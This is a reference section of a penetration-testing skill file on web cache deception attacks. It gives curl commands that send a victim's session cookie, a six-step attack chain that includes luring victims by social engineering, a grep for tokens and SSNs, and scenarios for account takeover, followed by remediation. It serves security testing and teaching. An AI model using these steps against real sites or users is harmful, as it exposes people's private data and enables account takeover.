# performing-web-cache-deception-attack — 详细参考（由 SKILL.md 拆分）

# Header-based cache key manipulation
curl -b "session=VICTIM" -H "X-Original-URL: /account/profile" \
  "http://target.com/static/cached.css"
```

### Step 6 — Verify and Document the Attack
```bash
# Full attack chain:
# 1. Craft malicious URL: http://target.com/account/profile/x.css
# 2. Send URL to victim (via social engineering, email, etc.)
# 3. Victim clicks link while authenticated
# 4. CDN caches the authenticated response
# 5. Attacker requests the same URL without authentication
# 6. CDN serves cached authenticated content to attacker

# Verify cache status
curl -I "http://target.com/account/profile/x.css"
# Confirm: X-Cache: HIT or CF-Cache-Status: HIT

# Check what sensitive data is exposed
curl -s "http://target.com/account/profile/x.css" | grep -i "email\|name\|token\|api_key\|ssn"
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| Cache Deception | Tricking CDN into caching authenticated dynamic content as static resource |
| Path Normalization | How CDN and origin differently resolve path segments (../, ;, encoded chars) |
| Cache Key | The identifier CDN uses to store/retrieve cached responses (typically URL path) |
| Static Extension Trick | Appending .css/.js/.png to dynamic URLs to trigger caching behavior |
| Delimiter Discrepancy | Characters (;, ?, #) interpreted differently by cache vs. origin server |
| Cache Poisoning vs Deception | Poisoning modifies cache for all users; deception caches specific victim data |
| Vary Header | HTTP header controlling which request attributes affect cache key |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| Burp Suite | HTTP proxy for crafting cache deception requests |
| curl | Command-line testing of cache behavior and response headers |
| Web Cache Vulnerability Scanner | Automated tool for detecting cache deception/poisoning |
| Param Miner | Burp extension for discovering unkeyed cache parameters |
| Cloudflare Diagnostics | Analyzing CF-Cache-Status and cf-ray headers |
| Varnish CLI | Direct cache inspection for Varnish-based setups |

## Common Scenarios

1. **Profile Data Theft** — Cache authenticated user profile pages containing PII (email, address, phone) by appending .css extension to profile URLs
2. **API Token Exposure** — Cache API dashboard pages showing tokens and secrets through path manipulation on CDN
3. **Account Takeover** — Cache pages containing session tokens or CSRF tokens, then use stolen tokens for account takeover
4. **Financial Data Exposure** — Cache banking or payment pages showing account balances and transaction history
5. **Admin Panel Caching** — Cache admin pages accessible through delimiter-based path confusion on CDN

## Output Format

```
## Web Cache Deception Report
- **Target**: http://target.com
- **CDN**: Cloudflare
- **Vulnerability**: Path-based cache deception via static extension appending

### Cache Behavior Analysis
| Extension | Cached | Cache-Control | TTL |
|-----------|--------|---------------|-----|
| .css | Yes | public, max-age=86400 | 24h |
| .js | Yes | public, max-age=86400 | 24h |
| .png | Yes | public, max-age=604800 | 7d |

### Exploitation Results
| Victim URL | Cached Data | Sensitive Fields |
|-----------|-------------|-----------------|
| /account/profile/x.css | Full profile page | Email, Name, API Key |
| /account/settings/x.js | Settings page | 2FA backup codes |

### Remediation
- Configure CDN to respect Cache-Control: no-store on dynamic pages
- Implement Vary: Cookie header on authenticated endpoints
- Use path-based routing rules that reject unexpected extensions
- Enable consistent path normalization between CDN and origin
```
